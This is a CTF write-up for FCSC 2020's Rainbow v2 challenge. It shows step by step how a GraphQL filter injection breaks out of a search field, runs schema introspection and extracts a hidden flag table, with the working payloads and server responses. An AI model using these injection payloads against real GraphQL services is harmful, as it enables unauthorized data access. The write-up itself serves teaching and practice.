---
title: FCSC 2020 Write-Up - Rainbow v2 - Advanced GraphQL Filter Injection
date: 2020-05-18 10:20:00 +07:00
tags: [english, FCSC, CTF, writeup, web, security, GraphQL, injection]
description: Exploiting GraphQL filter injection through carefully crafted payloads to bypass security controls in FCSC 2020's Rainbow v2 challenge.
---

## Challenge Overview

Rainbow v2 builds upon its predecessor with improved security measures. Unlike the first version where we could construct arbitrary GraphQL queries, this iteration restricts user input to a single search value that gets concatenated into a predefined query structure.

The security model has changed: we can no longer craft complete queries, only inject values into an existing query template.

## Initial Analysis

### Testing the Waters

I started by probing the application with various inputs to understand how it processes our search parameter:

#### Test Case 1: Null Byte Injection
```bash
search=%00
```
**Result:** Lists all data (interesting! The null byte bypasses the filter)

#### Test Case 2: Single Quote
```bash
search='
```
**Result:** Nothing returned

#### Test Case 3: Double Quote
```bash
search="
```
**Result:** Syntax error exposed!
```json
{
  "errors": [{
    "message": "Syntax Error: Cannot parse the unexpected character \"%\".",
    "locations": [{"line": 1, "column": 52}]
  }]
}
```

### Understanding the Query Structure

Based on error messages and behavior, i hypothesized that the backend query from Rainbow v1 was still in use, but now only the filter value was user-controllable:

```graphql
{ 
  allCooks (filter: { firstname: {like: "%INJECT_HERE%"}}) { 
    nodes { 
      firstname, 
      lastname, 
      speciality, 
      price 
    }
  }
}
```

Through further testing, i discovered the application was actually searching across **both** firstname and lastname fields using an `or` filter:

```graphql
{ 
  allCooks (
    filter: {
      or: [
        {lastname: {like: "%INJECT_HERE%"}},
        {firstname: {like: "%INJECT_HERE%"}}
      ],
    }
  ) { 
    nodes { 
      firstname, 
      lastname, 
      speciality, 
      price 
    }
  }
}
```

## Exploitation Strategy

### The Injection Concept

The goal was to break out of the filter context and inject additional GraphQL operations. I needed to:

1. Close the existing filter structure
2. Add introspection or custom queries
3. Handle the remaining query syntax that would be appended

### Building the Payload - Iteration 1

My first attempt at injecting introspection:

```bash
%"}}{firstname:{like:"%%"}}]}){nodes{id}}__schema{types{name,fields{name}}}allCooks(filter:{or:[{lastname:{like:"%
```

This attempts to:
- Close the current lastname filter: `%"`
- Close the firstname object: `}}`
- Complete the `or` array: `{firstname:{like:"%%"}}]`
- Close the filter and add nodes: `}){nodes{id}}`
- Inject introspection: `__schema{types{name,fields{name}}}`
- Start a new allCooks (which will be completed by the trailing query)

**Result:** Field conflict error!
```json
{
  "errors": [{
    "message": "Fields \"allCooks\" conflict because they have differing arguments. Use different aliases on the fields to fetch both if this was intentional."
  }]
}
```

### Understanding the Conflict

The error reveals that we can't have two `allCooks` fields in the same query with different arguments. GraphQL prevents this ambiguity. The solution? Comment out the trailing query!

### Building the Payload - Iteration 2

Adding a GraphQL comment (`#`) to neutralize the rest of the original query:

```bash
%"}}{firstname:{like:"%%"}}]}){nodes{id}}__schema{types{name,fields{name}}}#
```

**Result:** New error!
```json
{
  "errors": [{
    "message": "Syntax Error: Cannot parse the unexpected character \"%\".",
    "locations": [{"line": 2, "column": 1}]
  }]
}
```

### Debugging the Syntax

Let me reconstruct what the complete query looks like:

```graphql
{
  allCooks (
    filter: {
      or: [
        {lastname: {like:"%"}}{firstname:{like:"%%"}}]}){nodes{id}}__schema{types{name,fields{name}}}#%"}},
        {firstname: {like:"%"}}{firstname:{like:"%%"}}]}){nodes{id}}__schema{types{name,fields{name}}}#%"}}
      ]
    }
  ) {
    nodes { 
      firstname, 
      lastname, 
      speciality, 
      price 
    }
  }
}
```

The problem is clear: I'm closing the filter context but not properly closing the parent `allCooks` operation bracket!

### Building the Payload - Final Version

Adding the missing closing bracket:

```bash
%"}}{firstname:{like:"%%"}}]}){nodes{id}}__schema{types{name,fields{name}}}}#
```

**Success!** The introspection query executes and reveals the schema, including two critical discoveries:

- `allFlagNotTheSameTableNames` - The table name
- `flagNotTheSameFieldName` - The field name

The challenge authors deliberately obfuscated these names to prevent easy guessing!

### Extracting the Flag

With the schema revealed, i crafted the final payload to extract flags:

```bash
%"}}{firstname:{like:"%%"}}]}){nodes{firstname}} allFlagNotTheSameTableNames (filter: { flagNotTheSameFieldName: {like: "%%"}}) { nodes { flagNotTheSameFieldName}}}#
```

This payload:
1. Closes the original filter properly
2. Completes the first `allCooks` query
3. Adds a new query for `allFlagNotTheSameTableNames`
4. Comments out the trailing syntax

**Result:**
```json
{
  "data": {
    "allCooks": {
      "nodes": [
        {"firstname": "Thibault"},
        {"firstname": "Antoinette"},
        {"firstname": "Bernard"},
        {"firstname": "Trycia"},
        {"firstname": "Jaleel"},
        {"firstname": "Isaac"},
        {"firstname": "Delbert"},
        {"firstname": "Paula"},
        {"firstname": "Teagan"},
        {"firstname": "Garfield"},
        {"firstname": "Elisabeth"},
        {"firstname": "Casey"},
        {"firstname": "Consuelo"},
        {"firstname": "Luciano"},
        {"firstname": "Piper"},
        {"firstname": "Jace"}
      ]
    },
    "allFlagNotTheSameTableNames": {
      "nodes": [{
        "flagNotTheSameFieldName": "FCSC{70c48061ea21935f748b11188518b3322fcd8285b47059fa99df37f27430b071}"
      }]
    }
  }
}
```

## Conclusion

This challenge was significantly more interesting than v1. The developers tried to secure it by restricting user input to just the search value, but they made the classic mistake: string concatenation instead of parameterized queries.

The vulnerability came down to breaking out of the filter context by injecting special GraphQL characters (`}`, `{`, `#`). Once I understood the query structure through error messages, it was just a matter of carefully crafting payloads to close the existing syntax and inject my own queries. The `#` comment trick to neutralize the trailing query was key.

## References

- [GraphQL Injection](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [HackerOne GraphQL Reports](https://hackerone.com/reports?q=graphql)
- [API Hacking: GraphQL](https://medium.com/@ghostlulzhacks/api-hacking-graphql-7b2866ba1cf2)
